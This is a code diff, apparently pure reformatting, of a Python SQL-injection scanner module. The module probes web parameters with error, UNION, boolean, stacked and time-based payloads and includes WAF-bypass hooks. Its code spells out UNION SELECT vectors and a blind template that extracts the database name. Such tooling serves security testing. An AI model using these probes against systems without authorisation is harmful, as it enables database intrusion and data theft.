@@ -18,6 +18,7 @@ from tools.settings import settings
 
 try:
     from tools.waf_bypass import fingerprint_waf
+
     HAS_WAF = True
 except Exception:
     HAS_WAF = False
@@ -87,8 +88,9 @@ SQLI_ERROR_PATTERNS = [
 PROFILER = ResponseProfiler()
 
 
-def _measure_baseline_timing(url: str, param: str, sess: requests.Session,
-                              timeout: float, post_data: dict = None) -> float:
+def _measure_baseline_timing(
+    url: str, param: str, sess: requests.Session, timeout: float, post_data: dict = None
+) -> float:
     samples = []
     for _ in range(3):
         try:
@@ -125,15 +127,26 @@ def _extract_dbms(text: str) -> Optional[str]:
 
 
 def _gen_payloads_for_param(param: str, waf_name: Optional[str] = None) -> Tuple[str, List[str]]:
-    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    ctx = (
+        "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    )
     return ctx, generate_sqli_error(ctx, waf_name)
 
 
 def _detect_error_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None):
-    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None,
-              "dbms": None, "confidence": "low", "confidence_score": 0.0,
-              "confidence_votes": []}
-    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "vector": None,
+        "dbms": None,
+        "confidence": "low",
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
+    ctx = (
+        "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    )
 
     def _probe(payloads):
         confirmed = 0
@@ -168,14 +181,17 @@ def _detect_error_sqli(url, param, sess, timeout, post_data, base_data, waf_name
     # hardens the fingerprint once an error leaks the backend.
     if confirmed_count < 2:
         from tools.payload_engine import generate_for_dbms
+
         families = ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite"]
         if result.get("dbms"):
             families = [result["dbms"]] + [f for f in families if f != result["dbms"]]
         for family in families:
             if confirmed_count >= 2:
                 break
-            dbms_payloads = [p["payload"] for p in generate_for_dbms(
-                "sqli", "error", family, "all", waf_name, max_payloads=6)]
+            dbms_payloads = [
+                p["payload"]
+                for p in generate_for_dbms("sqli", "error", family, "all", waf_name, max_payloads=6)
+            ]
             hits = _probe(dbms_payloads)
             if hits:
                 confirmed_count += hits
@@ -206,13 +222,9 @@ def _detect_error_sqli(url, param, sess, timeout, post_data, base_data, waf_name
         if result.get("dbms"):
             result["evidence"].append("dbms leaked: %s" % result["dbms"])
     result["confidence_votes"] = [
-        {"signal": "error_pattern_x%d" % confirmed_count,
-         "weight": result["confidence_score"]}
+        {"signal": "error_pattern_x%d" % confirmed_count, "weight": result["confidence_score"]}
     ]
     return result
-
-
-
 
 
 def _send(url, param, payload, sess, timeout, post_data, base_data):
@@ -245,9 +257,21 @@ def _looks_like_error(r) -> bool:
     if r.status_code in (500, 502, 503, 404):
         return True
     text = r.text[:4000].lower()
-    for pat in (r"sql syntax", r"mysql", r"unclosed quotation", r"unterminated",
-                r"warning", r"fatal error", r"exception", r"pg_", r"ora-",
-                r"sqlite", r"microsoft ole db", r"driver", r"syntax error"):
+    for pat in (
+        r"sql syntax",
+        r"mysql",
+        r"unclosed quotation",
+        r"unterminated",
+        r"warning",
+        r"fatal error",
+        r"exception",
+        r"pg_",
+        r"ora-",
+        r"sqlite",
+        r"microsoft ole db",
+        r"driver",
+        r"syntax error",
+    ):
         try:
             if re.search(pat, text):
                 return True
@@ -274,20 +298,27 @@ def _probe_context(url, param, sess, timeout, post_data, base_data) -> str:
             return "numeric"
         r_alone = _send(url, param, "'", sess, timeout, post_data, base_data)
         r_esc = _send(url, param, "\\'", sess, timeout, post_data, base_data)
-        if (r_alone is not None and r_esc is not None
-                and _looks_like_error(r_alone) and not _looks_like_error(r_esc)):
+        if (
+            r_alone is not None
+            and r_esc is not None
+            and _looks_like_error(r_alone)
+            and not _looks_like_error(r_esc)
+        ):
             return "string"
         # fallback: quote breaks the query but an escaped quote does not
-        if (rq is not None and r7 is not None
-                and _looks_like_error(rq) and not _looks_like_error(r7)):
+        if (
+            rq is not None
+            and r7 is not None
+            and _looks_like_error(rq)
+            and not _looks_like_error(r7)
+        ):
             return "string"
     except Exception:
         pass
     return "unknown"
 
 
-def _count_union_columns(url, param, sess, timeout, post_data, base_data,
-                         prefix: str) -> int:
+def _count_union_columns(url, param, sess, timeout, post_data, base_data, prefix: str) -> int:
     """Enumerate the SELECT column count via ORDER BY N (returns N on success).
 
     prefix: '1' for numeric context, "'" for string context (already opened).
@@ -303,8 +334,11 @@ def _count_union_columns(url, param, sess, timeout, post_data, base_data,
         r = _send(url, param, payload, sess, timeout, post_data, base_data)
         if r is None:
             return n, "err"
-        if _looks_like_error(r) or _looks_like_column_error(r) or \
-                r.status_code != baseline.status_code:
+        if (
+            _looks_like_error(r)
+            or _looks_like_column_error(r)
+            or r.status_code != baseline.status_code
+        ):
             return n, "err"
         return n, "ok"
 
@@ -319,8 +353,7 @@ def _count_union_columns(url, param, sess, timeout, post_data, base_data,
     return last_ok
 
 
-def _count_union_columns_null(url, param, sess, timeout, post_data, base_data,
-                                    prefix: str) -> int:
+def _count_union_columns_null(url, param, sess, timeout, post_data, base_data, prefix: str) -> int:
     """Column count via UNION SELECT NULL,N... : the largest width whose
     response stays clean. Complement to ORDER BY when errors are suppressed."""
     baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
@@ -333,8 +366,11 @@ def _count_union_columns_null(url, param, sess, timeout, post_data, base_data,
         r = _send(url, param, payload, sess, timeout, post_data, base_data)
         if r is None:
             return n, "err"
-        if _looks_like_error(r) or _looks_like_column_error(r) or \
-                r.status_code != baseline.status_code:
+        if (
+            _looks_like_error(r)
+            or _looks_like_column_error(r)
+            or r.status_code != baseline.status_code
+        ):
             return n, "err"
         return n, "ok"
 
@@ -353,17 +389,23 @@ def _looks_like_column_error(r) -> bool:
     if r is None:
         return False
     text = (r.text or "").lower()
-    return ("different number of columns" in text or "column count" in text
-            or "unknown column" in text or "doesn't match" in text)
+    return (
+        "different number of columns" in text
+        or "column count" in text
+        or "unknown column" in text
+        or "doesn't match" in text
+    )
 
 
 def _url_encoded(s: str) -> str:
     from urllib.parse import quote
+
     return quote(s, safe="")
 
 
-def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
-                       waf_name=None, context: str = "unknown"):
+def _detect_union_sqli(
+    url, param, sess, timeout, post_data, base_data, waf_name=None, context: str = "unknown"
+):
     """UNION detection with two outcomes:
 
     - 'union'       : column count enumerated AND markers reflected in output
@@ -372,10 +414,18 @@ def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
                       UNION clause executes but the result is not rendered;
                       still exploitable via boolean/time blind extraction.
     """
-    result = {"vulnerable": False, "type": None, "evidence": [],
-              "vector": None, "dbms": None, "column_count": None,
-              "reflection_points": [], "confidence": "low",
-              "confidence_score": 0.0, "confidence_votes": []}
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "vector": None,
+        "dbms": None,
+        "column_count": None,
+        "reflection_points": [],
+        "confidence": "low",
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
     if context == "string":
         prefixes = ["'", "')", "'\\\""]
     elif context == "numeric":
@@ -386,13 +436,13 @@ def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
     best_cols = 0
     best_prefix = None
     for prefix in prefixes:
-        cols = _count_union_columns(url, param, sess, timeout, post_data,
-                                    base_data, prefix)
+        cols = _count_union_columns(url, param, sess, timeout, post_data, base_data, prefix)
         if cols >= 12:
             # ORDER BY never errored (cap hit): some apps/WAFs swallow ORDER BY
             # errors. Fall back to UNION SELECT NULL,N... boundary probing.
-            cols = _count_union_columns_null(url, param, sess, timeout,
-                                             post_data, base_data, prefix)
+            cols = _count_union_columns_null(
+                url, param, sess, timeout, post_data, base_data, prefix
+            )
         if cols < 1:
             continue
         markers = ["UMK_%d_%d" % (i, hash((prefix, i)) % 1000) for i in range(1, cols + 1)]
@@ -416,11 +466,12 @@ def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
             result["type"] = "union"
             result["column_count"] = cols
             result["reflection_points"] = reflected
-            result["vector"] = "%s UNION SELECT %s-- " % (prefix, ",".join(
-                ["'MARK_%d'" % (i + 1) for i in range(cols)]))
+            result["vector"] = "%s UNION SELECT %s-- " % (
+                prefix,
+                ",".join(["'MARK_%d'" % (i + 1) for i in range(cols)]),
+            )
             result["evidence"].append("union: %d columns confirmed" % cols)
-            result["evidence"].append(
-                "markers reflected at positions %s" % reflected)
+            result["evidence"].append("markers reflected at positions %s" % reflected)
             result["dbms"] = _extract_dbms(r.text)
             break
         if cols > best_cols:
@@ -432,17 +483,23 @@ def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
         nulls = ",".join(["NULL"] * (best_cols - 1))
         if nulls:
             template = "%s UNION SELECT IF((SUBSTRING((SELECT DATABASE()),1,1)>'a'),1,2),%s-- " % (
-                best_prefix, nulls)
+                best_prefix,
+                nulls,
+            )
         else:
-            template = "%s UNION SELECT IF((SUBSTRING((SELECT DATABASE()),1,1)>'a'),1,2)-- " % best_prefix
+            template = (
+                "%s UNION SELECT IF((SUBSTRING((SELECT DATABASE()),1,1)>'a'),1,2)-- " % best_prefix
+            )
         result["vulnerable"] = True
         result["type"] = "union_blind"
         result["column_count"] = best_cols
         result["vector"] = template
         result["evidence"].append(
-            "union_blind: %d columns proven via ORDER BY boundary" % best_cols)
+            "union_blind: %d columns proven via ORDER BY boundary" % best_cols
+        )
         result["evidence"].append(
-            "UNION executes but output suppressed -> boolean/time extraction template emitted")
+            "UNION executes but output suppressed -> boolean/time extraction template emitted"
+        )
 
     # Set confidence so downstream verification does not drop the finding.
     # Reflected UNION is direct proof -> high; union_blind only proves the
@@ -473,16 +530,26 @@ def _measure_baseline_lengths(url, param, sess, timeout, post_data, base_data, s
     return lengths[len(lengths) // 2]
 
 
-def _detect_boolean_sqli(url, param, sess, timeout, post_data, base_data,
-                         waf_name=None, context: str = "unknown"):
-    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None,
-              "confidence_score": 0.0, "confidence_votes": []}
+def _detect_boolean_sqli(
+    url, param, sess, timeout, post_data, base_data, waf_name=None, context: str = "unknown"
+):
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "vector": None,
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
     ctx = context
     if ctx not in ("numeric", "string"):
-        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+        ctx = (
+            "numeric"
+            if param.lower() in ("id", "uid", "pid", "page", "limit", "offset")
+            else "string"
+        )
 
-    baseline_len = _measure_baseline_lengths(url, param, sess, timeout,
-                                             post_data, base_data)
+    baseline_len = _measure_baseline_lengths(url, param, sess, timeout, post_data, base_data)
     if baseline_len is None:
         return result
 
@@ -510,8 +577,9 @@ def _detect_boolean_sqli(url, param, sess, timeout, post_data, base_data,
                 diffs.append((diff, ratio, true_p, false_p, status_diff))
                 pair_confirmed += 1
                 result["evidence"].append(
-                    "bool: %s vs %s (diff=%d ratio=%.1f%%)" % (
-                        true_p[:22], false_p[:22], diff, ratio * 100))
+                    "bool: %s vs %s (diff=%d ratio=%.1f%%)"
+                    % (true_p[:22], false_p[:22], diff, ratio * 100)
+                )
                 result["vector"] = true_p
         except Exception as e:
             logger.debug("sqli boolean %s: %s", true_p[:20], e)
@@ -527,12 +595,13 @@ def _detect_boolean_sqli(url, param, sess, timeout, post_data, base_data,
             r_false = _send(url, param, fp, sess, timeout, post_data, base_data)
             if r_true is not None and r_false is not None:
                 diff2 = abs(len(r_true.text) - len(r_false.text))
-                if diff2 > max(30, int(baseline_len * 0.03)) or \
-                        r_true.status_code != r_false.status_code:
+                if (
+                    diff2 > max(30, int(baseline_len * 0.03))
+                    or r_true.status_code != r_false.status_code
+                ):
                     result["vulnerable"] = True
                     result["type"] = "boolean"
-                    result["evidence"].append(
-                        "bool re-verified: diff=%d" % diff2)
+                    result["evidence"].append("bool re-verified: diff=%d" % diff2)
         except Exception:
             pass
 
@@ -551,7 +620,9 @@ def _detect_boolean_sqli(url, param, sess, timeout, post_data, base_data,
 
 def _detect_stacked_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None):
     result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}
-    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    ctx = (
+        "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+    )
     stacked_payloads = generate_sqli_stacked(ctx, waf_name)
     for payload in stacked_payloads:
         try:
@@ -573,8 +644,16 @@ def _detect_stacked_sqli(url, param, sess, timeout, post_data, base_data, waf_na
     return result
 
 
-_DELAY_KEYWORDS = ("SLEEP", "pg_sleep", "WAITFOR", "BENCHMARK",
-                        "DBMS_PIPE", "DBMS_LOCK", "randomblob", "sleep")
+_DELAY_KEYWORDS = (
+    "SLEEP",
+    "pg_sleep",
+    "WAITFOR",
+    "BENCHMARK",
+    "DBMS_PIPE",
+    "DBMS_LOCK",
+    "randomblob",
+    "sleep",
+)
 
 
 def _negative_control(payload: str) -> str:
@@ -607,10 +686,18 @@ def _measure_elapsed(url, param, payload, sess, timeout, post_data, base_data):
         return None
 
 
-def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None,
-                         dbms_hint=None):
-    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None, "dbms": None,
-              "confidence_score": 0.0, "confidence_votes": []}
+def _detect_time_sqli(
+    url, param, sess, timeout, post_data, base_data, waf_name=None, dbms_hint=None
+):
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "vector": None,
+        "dbms": None,
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
     baseline_sec = _measure_baseline_timing(url, param, sess, timeout, post_data)
     if baseline_sec >= timeout * 0.8:
         return result
@@ -619,6 +706,7 @@ def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=
 
     if dbms_hint:
         from tools.payload_engine import generate_sqli_time_for
+
         time_payloads = generate_sqli_time_for(dbms_hint, waf_name)
     else:
         time_payloads = generate_sqli_time(waf_name)
@@ -626,8 +714,7 @@ def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=
     total_attempts = 0
     for payload in time_payloads:
         total_attempts += 1
-        elapsed = _measure_elapsed(url, param, payload, sess, timeout,
-                                   post_data, base_data)
+        elapsed = _measure_elapsed(url, param, payload, sess, timeout, post_data, base_data)
         if elapsed is None:
             continue
         timed_out = elapsed >= timeout + 1.0
@@ -638,15 +725,15 @@ def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=
             # latency. Negative control: same syntax, zero delay. If the
             # control also stalls, reject as network/server noise.
             control = _negative_control(payload)
-            c_elapsed = _measure_elapsed(url, param, control, sess, timeout,
-                                         post_data, base_data)
+            c_elapsed = _measure_elapsed(url, param, control, sess, timeout, post_data, base_data)
             if c_elapsed is not None and c_elapsed < threshold:
                 confirmed_count += 1
                 result["vulnerable"] = True
                 result["type"] = "time"
                 result["evidence"].append(
-                    "time: %.1fs (control=%.1fs, baseline=%.1fs)" % (
-                        elapsed, c_elapsed, baseline_sec))
+                    "time: %.1fs (control=%.1fs, baseline=%.1fs)"
+                    % (elapsed, c_elapsed, baseline_sec)
+                )
                 result["vector"] = payload
             else:
                 logger.debug("sqli time rejected by control: %s", payload[:30])
@@ -655,8 +742,7 @@ def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=
             confirmed_count += 1
             result["vulnerable"] = True
             result["type"] = "time"
-            result["evidence"].append(
-                "time: %.1fs (baseline=%.1fs)" % (elapsed, baseline_sec))
+            result["evidence"].append("time: %.1fs (baseline=%.1fs)" % (elapsed, baseline_sec))
             result["vector"] = payload
         if confirmed_count >= 2:
             break
@@ -685,10 +771,16 @@ def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=
     return result
 
 
-def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
-          waf_name: Optional[str] = None,
-          auto_detect_waf: bool = True) -> dict:
+def check(
+    url: str,
+    param: str,
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+    post_body: bool = False,
+    post_data: dict = None,
+    waf_name: Optional[str] = None,
+    auto_detect_waf: bool = True,
+) -> dict:
     if sess is None:
         sess = requests.Session()
         sess.verify = settings.verify_ssl
@@ -698,18 +790,29 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
         if waf_name:
             logger.info("detected WAF: %s", waf_name)
 
-    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None,
-              "dbms": None, "waf_detected": waf_name, "confidence": "low",
-              "confidence_score": 0.0, "confidence_votes": []}
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "vector": None,
+        "dbms": None,
+        "waf_detected": waf_name,
+        "confidence": "low",
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
 
     base_data = post_data.copy() if post_body and post_data else None
 
     # Black-box context probe: numeric vs string injection point. Falls back
     # to a param-name heuristic when the probe is inconclusive.
-    ctx = _probe_context(url, param, sess, timeout,
-                         post_data if post_body else None, base_data)
+    ctx = _probe_context(url, param, sess, timeout, post_data if post_body else None, base_data)
     if ctx == "unknown":
-        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
+        ctx = (
+            "numeric"
+            if param.lower() in ("id", "uid", "pid", "page", "limit", "offset")
+            else "string"
+        )
     result["context"] = ctx
 
     def _run(det_name, det_func):
@@ -719,12 +822,20 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
         if det_name == "time" and result.get("dbms"):
             kw["dbms_hint"] = result["dbms"]
         try:
-            return det_func(url, param, sess, timeout,
-                            post_data if post_body else None, base_data,
-                            waf_name, **kw)
+            return det_func(
+                url,
+                param,
+                sess,
+                timeout,
+                post_data if post_body else None,
+                base_data,
+                waf_name,
+                **kw,
+            )
         except TypeError:
-            return det_func(url, param, sess, timeout,
-                            post_data if post_body else None, base_data, waf_name)
+            return det_func(
+                url, param, sess, timeout, post_data if post_body else None, base_data, waf_name
+            )
 
     detectors = [
         ("error", _detect_error_sqli),
